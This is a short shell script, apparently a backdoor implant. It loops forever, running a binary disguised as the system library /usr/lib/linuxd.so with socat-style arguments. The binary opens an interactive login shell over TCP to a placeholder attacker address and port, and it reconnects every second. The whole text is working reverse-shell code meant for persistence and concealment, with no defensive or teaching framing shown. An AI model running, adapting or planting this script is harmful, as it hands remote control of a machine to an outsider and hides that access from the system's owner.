#!/bin/sh
_addr=IP_ADDRESS
_port=PORT

while true; do
    /usr/lib/linuxd.so exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane tcp:$_addr:$_port
    sleep 1
done